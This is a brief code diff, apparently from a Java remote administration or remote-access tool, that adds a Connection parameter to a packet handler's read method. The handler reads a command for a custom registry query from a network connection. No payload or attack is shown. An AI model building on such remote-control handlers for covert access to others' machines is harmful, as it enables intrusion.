@@ -7,7 +7,7 @@ import com.redpois0n.oslib.OperatingSystem;
 public class Packet80CustomRegQuery extends AbstractIncomingPacket {
 
 	@Override
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		String cmd = Connection.instance.readLine();
 		
 		try {
